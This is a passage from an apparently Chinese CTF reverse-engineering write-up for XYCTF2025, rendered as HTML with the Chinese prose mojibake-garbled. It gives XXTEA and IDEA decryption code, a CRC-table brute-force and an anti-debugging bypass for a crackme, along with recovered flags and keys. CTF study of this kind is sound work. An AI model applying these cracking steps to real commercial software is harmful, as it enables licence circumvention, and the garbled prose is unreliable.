class="built_in">j_system</span>(byte_1401A11A0);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_20:</span><br><span class="line">  <span class="built_in">j__RTC_CheckStackVars</span>(&amp;v9, (_RTC_framedesc *)&amp;unk_1401A1140);</span><br><span class="line">  <span class="built_in">j___security_check_cookie</span>((<span class="type">unsigned</span> __int64)v10 ^ v34);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_1401F8E9B</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ¸…æ™°çœ‹å‡ºæ¥æ˜¯XXTEAåŠ å¯†ï¼Œå¯†é’¥æ˜¯å›ºå®šç§å­éšæœºæ•°éšæœºå¾—åˆ°çš„ï¼ŒDeltaè¢«é­”æ”¹ï¼Œç„¶åå¯†æ–‡ä¹Ÿèƒ½çœ‹åˆ°ã€‚</p><p><strong>æ³¨ï¼šå†™WPæ—¶ç”¨çš„æ˜¯æ—§ç‰ˆé™„ä»¶åˆ†æï¼Œç¼ºå¤±äº†åé¢16å­—èŠ‚å¯†æ–‡</strong></p><p>å®Œæ•´å¯†æ–‡æ•°æ®ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xa9934e2f</span>, <span class="number">0x30b90fa</span>, <span class="number">0xdcbf1d3</span>, <span class="number">0x328b5bde</span>,</span><br><span class="line"><span class="number">0x44fab4e</span>, <span class="number">0x1dcf0051</span>, <span class="number">0x85ebbe55</span>, <span class="number">0x93aa773a</span></span><br></pre></td></tr></table></figure><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x61C88646</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">7</span>;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">                <span class="keyword">if</span> (z == <span class="number">0xA4F41487</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;11\n&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (y == <span class="number">0xA4F41487</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;11\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">7</span>;</span><br><span class="line">        sum = rounds * DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0xAABB</span>);</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>]&#123;&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> Enc[]&#123;</span><br><span class="line">        <span class="number">0xa9934e2f</span>, <span class="number">0x30b90fa</span>, <span class="number">0xdcbf1d3</span>, <span class="number">0x328b5bde</span>,</span><br><span class="line">        <span class="number">0x44fab4e</span>, <span class="number">0x1dcf0051</span>, <span class="number">0x85ebbe55</span>, <span class="number">0x93aa773a</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key[i] = <span class="built_in">rand</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">xxtea</span>(Enc, <span class="number">-8</span>, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, Enc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{th15_15_51mpLe_obf_R19Ht?}</p><h2 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h2><p>æœ‰åè°ƒè¯•ï¼Œåœ¨WinMainå¼€å¤´æ–­ç‚¹ï¼Œä½¿ç”¨ScyllaHideä¸€æŠŠæ¢­å»é™¤ï¼ˆï¼ˆã€‚</p><p><img src="/2025/04/07/XYCTF2025/47.png"></p><p><img src="/2025/04/07/XYCTF2025/48.png"></p><p>ä»WinMainå¯ä»¥è·Ÿè¸ªåˆ°çª—å£æ¶ˆæ¯å‡½æ•°ï¼Œå›¾å››å°±æ˜¯éªŒè¯å‡½æ•°æŒ‰é’®æ¶ˆæ¯ã€‚</p><p><img src="/2025/04/07/XYCTF2025/49.png"></p><p><img src="/2025/04/07/XYCTF2025/50.png"></p><p><img src="/2025/04/07/XYCTF2025/51.png"></p><p><img src="/2025/04/07/XYCTF2025/52.png"></p><p>ä»TLSé‚£è¾¹å¯ä»¥çœ‹åˆ°å¯åŠ¨äº†ä¸€ä¸ªçº¿ç¨‹ï¼Œçº¿ç¨‹å‡½æ•°å¦‚ä¸‹</p><p><img src="/2025/04/07/XYCTF2025/53.png"></p><p>è¿™è¾¹æ­»å¾ªç¯åˆ¤æ–­äº†ä¸€ä¸ªå€¼ï¼Œç„¶åè°ƒç”¨CallBackï¼Œéšä¾¿è¾“å…¥flagï¼Œç‚¹å‡»éªŒè¯ï¼Œå‘ç°ä¼šå…ˆè°ƒç”¨CallBackä¸­çš„mark2å‡½æ•°è¿›è¡Œç¬¬ä¸€æ¬¡éªŒè¯ã€‚</p><p><img src="/2025/04/07/XYCTF2025/54.png"></p><p>å°†è¿™è¾¹v4éƒ½å¼‚æˆ–ä¸Š0xBBä¼šå¾—åˆ°â€flag{â€œäº”ä¸ªå­—ç¬¦ï¼Œå°±æ˜ç™½è¿™è¾¹æ˜¯æ£€æµ‹è¾“å…¥flagå¼€å¤´æ˜¯å¦ä¸ºâ€flag{â€œï¼Œè¿›è¡Œäº†ç¬¬ä¸€æ¬¡éªŒè¯ï¼Œç„¶åç»§ç»­ä¸‹ä¸€æ¬¡éªŒè¯è¿›å…¥äº†case 5çš„mark3å‡½æ•°ã€‚</p><p><img src="/2025/04/07/XYCTF2025/55.png"></p><p>mark3è¿™è¾¹æ˜¯ç”¨å›ºå®šå€¼ç”Ÿæˆäº†ä¸€ä¸ªv5æ•°å€¼åˆ—è¡¨ï¼Œa1æ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°+5è·³è¿‡äº†å‰é¢çš„äº”ä¸ªå­—ç¬¦ï¼Œç„¶åå¯¹æ‹¬å·å†…çš„å‰7ä¸ªå­—ç¬¦åšä¸€äº›åŠ å¯†è®¡ç®—ç„¶åå’Œv5åˆ—è¡¨å‰7ä¸ªæ•°å€¼è¿›è¡Œæ£€éªŒã€‚</p><p>è¿™è¾¹å°±å¯ä»¥ç›´æ¥æå–v5ç”Ÿæˆçš„æ•°å€¼åˆ—è¡¨ï¼Œç„¶ååˆ©ç”¨çˆ†ç ´å¾—åˆ°æ‹¬å·å†…çš„å‰ä¸ƒä¸ªå­—ç¬¦ã€‚</p><p><img src="/2025/04/07/XYCTF2025/56.png"></p><p>çˆ†ç ´ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> box1[] = &#123;</span><br><span class="line">      <span class="number">0x00000000</span>, <span class="number">0xC0BA6CAC</span>, <span class="number">0x5A05DF1B</span>, <span class="number">0x9ABFB3B7</span>, <span class="number">0xB40BBE36</span>, <span class="number">0x74B1D29A</span>,</span><br><span class="line">      <span class="number">0xEE0E612D</span>, <span class="number">0x2EB40D81</span>, <span class="number">0xB3667A2F</span>, <span class="number">0x73DC1683</span>, <span class="number">0xE963A534</span>, <span class="number">0x29D9C998</span>, <span class="number">0x076DC419</span>, <span class="number">0xC7D7A8B5</span>,</span><br><span class="line">      <span class="number">0x5D681B02</span>, <span class="number">0x9DD277AE</span>, <span class="number">0xBDBDF21D</span>, <span class="number">0x7D079EB1</span>, <span class="number">0xE7B82D06</span>, <span class="number">0x270241AA</span>, <span class="number">0x09B64C2B</span>, <span class="number">0xC90C2087</span>,</span><br><span class="line">      <span class="number">0x53B39330</span>, <span class="number">0x9309FF9C</span>, <span class="number">0x0EDB8832</span>, <span class="number">0xCE61E49E</span>, <span class="number">0x54DE5729</span>, <span class="number">0x94643B85</span>, <span class="number">0xBAD03604</span>, <span class="number">0x7A6A5AA8</span>,</span><br><span class="line">      <span class="number">0xE0D5E91F</span>, <span class="number">0x206F85B3</span>, <span class="number">0xA00AE279</span>, <span class="number">0x60B08ED5</span>, <span class="number">0xFA0F3D62</span>, <span class="number">0x3AB551CE</span>, <span class="number">0x14015C4F</span>, <span class="number">0xD4BB30E3</span>,</span><br><span class="line">      <span class="number">0x4E048354</span>, <span class="number">0x8EBEEFF8</span>, <span class="number">0x136C9856</span>, <span class="number">0xD3D6F4FA</span>, <span class="number">0x4969474D</span>, <span class="number">0x89D32BE1</span>, <span class="number">0xA7672660</span>, <span class="number">0x67DD4ACC</span>,</span><br><span class="line">      <span class="number">0xFD62F97B</span>, <span class="number">0x3DD895D7</span>, <span class="number">0x1DB71064</span>, <span class="number">0xDD0D7CC8</span>, <span class="number">0x47B2CF7F</span>, <span class="number">0x8708A3D3</span>, <span class="number">0xA9BCAE52</span>, <span class="number">0x6906C2FE</span>,</span><br><span class="line">      <span class="number">0xF3B97149</span>, <span class="number">0x33031DE5</span>, <span class="number">0xAED16A4B</span>, <span class="number">0x6E6B06E7</span>, <span class="number">0xF4D4B550</span>, <span class="number">0x346ED9FC</span>, <span class="number">0x1ADAD47D</span>, <span class="number">0xDA60B8D1</span>,</span><br><span class="line">      <span class="number">0x40DF0B66</span>, <span class="number">0x806567CA</span>, <span class="number">0x9B64C2B1</span>, <span class="number">0x5BDEAE1D</span>, <span class="number">0xC1611DAA</span>, <span class="number">0x01DB7106</span>, <span class="number">0x2F6F7C87</span>, <span class="number">0xEFD5102B</span>,</span><br><span class="line">      <span class="number">0x756AA39C</span>, <span class="number">0xB5D0CF30</span>, <span class="number">0x2802B89E</span>, <span class="number">0xE8B8D432</span>, <span class="number">0x72076785</span>, <span class="number">0xB2BD0B29</span>, <span class="number">0x9C0906A8</span>, <span class="number">0x5CB36A04</span>,</span><br><span class="line">      <span class="number">0xC60CD9B3</span>, <span class="number">0x06B6B51F</span>, <span class="number">0x26D930AC</span>, <span class="number">0xE6635C00</span>, <span class="number">0x7CDCEFB7</span>, <span class="number">0xBC66831B</span>, <span class="number">0x92D28E9A</span>, <span class="number">0x5268E236</span>,</span><br><span class="line">      <span class="number">0xC8D75181</span>, <span class="number">0x086D3D2D</span>, <span class="number">0x95BF4A83</span>, <span class="number">0x5505262F</span>, <span class="number">0xCFBA9598</span>, <span class="number">0x0F00F934</span>, <span class="number">0x21B4F4B5</span>, <span class="number">0xE10E9819</span>,</span><br><span class="line">      <span class="number">0x7BB12BAE</span>, <span class="number">0xBB0B4702</span>, <span class="number">0x3B6E20C8</span>, <span class="number">0xFBD44C64</span>, <span class="number">0x616BFFD3</span>, <span class="number">0xA1D1937F</span>, <span class="number">0x8F659EFE</span>, <span class="number">0x4FDFF252</span>,</span><br><span class="line">      <span class="number">0xD56041E5</span>, <span class="number">0x15DA2D49</span>, <span class="number">0x88085AE7</span>, <span class="number">0x48B2364B</span>, <span class="number">0xD20D85FC</span>, <span class="number">0x12B7E950</span>, <span class="number">0x3C03E4D1</span>, <span class="number">0xFCB9887D</span>,</span><br><span class="line">      <span class="number">0x66063BCA</span>, <span class="number">0xA6BC5766</span>, <span class="number">0x86D3D2D5</span>, <span class="number">0x4669BE79</span>, <span class="number">0xDCD60DCE</span>, <span class="number">0x1C6C6162</span>, <span class="number">0x32D86CE3</span>, <span class="number">0xF262004F</span>,</span><br><span class="line">      <span class="number">0x68DDB3F8</span>, <span class="number">0xA867DF54</span>, <span class="number">0x35B5A8FA</span>, <span class="number">0xF50FC456</span>, <span class="number">0x6FB077E1</span>, <span class="number">0xAF0A1B4D</span>, <span class="number">0x81BE16CC</span>, <span class="number">0x41047A60</span>,</span><br><span class="line">      <span class="number">0xDBBBC9D7</span>, <span class="number">0x1B01A57B</span>, <span class="number">0xEDB88321</span>, <span class="number">0x2D02EF8D</span>, <span class="number">0xB7BD5C3A</span>, <span class="number">0x77073096</span>, <span class="number">0x59B33D17</span>, <span class="number">0x990951BB</span>,</span><br><span class="line">      <span class="number">0x03B6E20C</span>, <span class="number">0xC30C8EA0</span>, <span class="number">0x5EDEF90E</span>, <span class="number">0x9E6495A2</span>, <span class="number">0x04DB2615</span>, <span class="number">0xC4614AB9</span>, <span class="number">0xEAD54738</span>, <span class="number">0x2A6F2B94</span>,</span><br><span class="line">      <span class="number">0xB0D09823</span>, <span class="number">0x706AF48F</span>, <span class="number">0x5005713C</span>, <span class="number">0x90BF1D90</span>, <span class="number">0x0A00AE27</span>, <span class="number">0xCABAC28B</span>, <span class="number">0xE40ECF0A</span>, <span class="number">0x24B4A3A6</span>,</span><br><span class="line">      <span class="number">0xBE0B1011</span>, <span class="number">0x7EB17CBD</span>, <span class="number">0xE3630B13</span>, <span class="number">0x23D967BF</span>, <span class="number">0xB966D408</span>, <span class="number">0x79DCB8A4</span>, <span class="number">0x5768B525</span>, <span class="number">0x97D2D989</span>,</span><br><span class="line">      <span class="number">0x0D6D6A3E</span>, <span class="number">0xCDD70692</span>, <span class="number">0x4DB26158</span>, <span class="number">0x8D080DF4</span>, <span class="number">0x17B7BE43</span>, <span class="number">0xD70DD2EF</span>, <span class="number">0xF9B9DF6E</span>, <span class="number">0x3903B3C2</span>,</span><br><span class="line">      <span class="number">0xA3BC0075</span>, <span class="number">0x63066CD9</span>, <span class="number">0xFED41B77</span>, <span class="number">0x3E6E77DB</span>, <span class="number">0xA4D1C46C</span>, <span class="number">0x646BA8C0</span>, <span class="number">0x4ADFA541</span>, <span class="number">0x8A65C9ED</span>,</span><br><span class="line">      <span class="number">0x10DA7A5A</span>, <span class="number">0xD06016F6</span>, <span class="number">0xF00F9345</span>, <span class="number">0x30B5FFE9</span>, <span class="number">0xAA0A4C5E</span>, <span class="number">0x6AB020F2</span>, <span class="number">0x44042D73</span>, <span class="number">0x84BE41DF</span>,</span><br><span class="line">      <span class="number">0x1E01F268</span>, <span class="number">0xDEBB9EC4</span>, <span class="number">0x4369E96A</span>, <span class="number">0x83D385C6</span>, <span class="number">0x196C3671</span>, <span class="number">0xD9D65ADD</span>, <span class="number">0xF762575C</span>, <span class="number">0x37D83BF0</span>,</span><br><span class="line">      <span class="number">0xAD678847</span>, <span class="number">0x6DDDE4EB</span>, <span class="number">0x76DC4190</span>, <span class="number">0xB6662D3C</span>, <span class="number">0x2CD99E8B</span>, <span class="number">0xEC63F227</span>, <span class="number">0xC2D7FFA6</span>, <span class="number">0x026D930A</span>,</span><br><span class="line">      <span class="number">0x98D220BD</span>, <span class="number">0x58684C11</span>, <span class="number">0xC5BA3BBF</span>, <span class="number">0x05005713</span>, <span class="number">0x9FBFE4A4</span>, <span class="number">0x5F058808</span>, <span class="number">0x71B18589</span>, <span class="number">0xB10BE925</span>,</span><br><span class="line">      <span class="number">0x2BB45A92</span>, <span class="number">0xEB0E363E</span>, <span class="number">0xCB61B38D</span>, <span class="number">0x0BDBDF21</span>, <span class="number">0x91646C96</span>, <span class="number">0x51DE003A</span>, <span class="number">0x7F6A0DBB</span>, <span class="number">0xBFD06117</span>,</span><br><span class="line">      <span class="number">0x256FD2A0</span>, <span class="number">0xE5D5BE0C</span>, <span class="number">0x7807C9A2</span>, <span class="number">0xB8BDA50E</span>, <span class="number">0x220216B9</span>, <span class="number">0xE2B87A15</span>, <span class="number">0xCC0C7794</span>, <span class="number">0x0CB61B38</span>,</span><br><span class="line">      <span class="number">0x9609A88F</span>, <span class="number">0x56B3C423</span>, <span class="number">0xD6D6A3E9</span>, <span class="number">0x166CCF45</span>, <span class="number">0x8CD37CF2</span>, <span class="number">0x4C69105E</span>, <span class="number">0x62DD1DDF</span>, <span class="number">0xA2677173</span>,</span><br><span class="line">      <span class="number">0x38D8C2C4</span>, <span class="number">0xF862AE68</span>, <span class="number">0x65B0D9C6</span>, <span class="number">0xA50AB56A</span>, <span class="number">0x3FB506DD</span>, <span class="number">0xFF0F6A71</span>, <span class="number">0xD1BB67F0</span>, <span class="number">0x11010B5C</span>,</span><br><span class="line">      <span class="number">0x8BBEB8EB</span>, <span class="number">0x4B04D447</span>, <span class="number">0x6B6B51F4</span>, <span class="number">0xABD13D58</span>, <span class="number">0x316E8EEF</span>, <span class="number">0xF1D4E243</span>, <span class="number">0xDF60EFC2</span>, <span class="number">0x1FDA836E</span>,</span><br><span class="line">      <span class="number">0x856530D9</span>, <span class="number">0x45DF5C75</span>, <span class="number">0xD80D2BDB</span>, <span class="number">0x18B74777</span>, <span class="number">0x8208F4C0</span>, <span class="number">0x42B2986C</span>, <span class="number">0x6C0695ED</span>, <span class="number">0xACBCF941</span>,</span><br><span class="line">      <span class="number">0x36034AF6</span>, <span class="number">0xF6B9265A</span>, <span class="number">0xCCCCCCCC</span>, <span class="number">0xCCCCCC00</span>, <span class="number">0x00000100</span>, <span class="number">0x00000000</span>, <span class="number">0xF6B9265A</span>, <span class="number">0xCCCCCCCC</span>,</span><br><span class="line">      <span class="number">0x00000008</span>, <span class="number">0x00000000</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> enc1[]&#123;</span><br><span class="line">      <span class="number">0x46A95BAD</span>,</span><br><span class="line">      <span class="number">0x1CAC84B6</span>,</span><br><span class="line">      <span class="number">0xA67CB2B2</span>,</span><br><span class="line">      <span class="number">0x32188937</span>,</span><br><span class="line">      <span class="number">0x4872D39F</span>,</span><br><span class="line">      <span class="number">0xF2A2E59B</span>,</span><br><span class="line">      <span class="number">0x011B94D2</span>,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// çˆ†ç ´å‰7å­—èŠ‚</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">28</span>; c &lt; <span class="number">132</span>; c++)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">if</span> ((~box1[(<span class="type">uint8_t</span>)c ^ <span class="number">0x79</span>] ^ <span class="number">0xB0E0E879</span>) == enc1[i])</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å‰ä¸ƒä¸ªå­—ç¬¦ä¸ºï¼š<strong>moshui_</strong></p><p>ç¬¬ä¸‰æ¬¡Checkæ˜¯åœ¨case 0å¤„ï¼Œç¨‹åºèµ·å§‹çš„æ—¶å€™å¯äº†ä¸€ä¸ªçº¿ç¨‹ï¼Œæ­»å¾ªç¯ç„¶åè¿™è¾¹åˆ¤æ–­å‰ä¸¤æ¬¡Checkæ˜¯å¦æˆåŠŸï¼Œç„¶åè¿›å…¥æœ€åä¸€æ¬¡Checkä»£ç ã€‚</p><p><img src="/2025/04/07/XYCTF2025/57.png"></p><p><img src="/2025/04/07/XYCTF2025/58.png"></p><p>å¼€å§‹çš„æ—¶å€™åˆ©ç”¨å‰äº”ä¸ªå­—èŠ‚ä»¥åŠæ‹¬å·å†…å‰ä¸ƒä¸ªå­—èŠ‚ç”Ÿæˆäº†ä¸¤ä¸ªå››å­—èŠ‚å¯†é’¥ï¼Œç„¶ååˆèµ‹å€¼äº†å¦å¤–ä¸¤ä¸ªå›ºå®šçš„å¯†é’¥å€¼ã€‚</p><p>ç”±äºå‰äº”å­—èŠ‚å’Œæ‹¬å·å†…å‰ä¸ƒä¸ªå­—èŠ‚æ˜¯å·²çŸ¥å›ºå®šçš„ï¼Œæ‰€ä»¥ç”Ÿæˆçš„å¯†é’¥ä¹Ÿæ˜¯å›ºå®šï¼Œå¯ä»¥ç›´æ¥æå–è®¡ç®—å®Œçš„å¯†é’¥ã€‚</p><p>å¯†é’¥ï¼š<strong>0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF</strong></p><p><img src="/2025/04/07/XYCTF2025/59.png"></p><p>ç„¶åä¸‹é¢èµ‹å€¼äº†å¯†æ–‡åˆ°v7ï¼Œåˆ¤æ–­è¾“å…¥çš„å­—ç¬¦ä¸²ç¬¬29ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºâ€™}â€™ï¼Œè¿™è¾¹å¯çŸ¥flagé•¿åº¦ä¸º29ï¼Œç„¶ååˆ©ç”¨å¯†é’¥å’Œè¾“å…¥å­—ç¬¦ä¸²ï¼Œè¿›è¡ŒåŠ å¯†ï¼Œæœ€åå’Œv7åˆ¤æ–­ã€‚</p><p><img src="/2025/04/07/XYCTF2025/60.png"></p><p>åŠ å¯†æ˜¯8å­—èŠ‚8å­—èŠ‚åŠ å¯†ï¼Œè§‚å¯Ÿsub_7FF7ADAB1640å¯çŸ¥æ˜¯IDEAåŠ å¯†ç®—æ³•ï¼Œå¾ªç¯åŠ å¯†0x10000æ¬¡æ²¡ä»€ä¹ˆç”¨ï¼Œå› ä¸ºInputå’ŒOutputåœ¨ä¸¤ä¸ªä¸åŒæ•°ç»„ï¼Œæ‰€ä»¥å’ŒåŠ å¯†ä¸€æ¬¡æ˜¯ä¸€æ ·ç»“æœã€‚</p><p>åˆ©ç”¨IDEAè§£å¯†ç®—æ³•é…åˆå¯†é’¥è§£å¯†v7çš„å€¼å³å¯å¾—åˆ°å16å­—èŠ‚ï¼Œæœ€åæ‹¼æ¥å¾—åˆ°å®Œæ•´flagã€‚</p><p><img src="/2025/04/07/XYCTF2025/61.png"></p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span 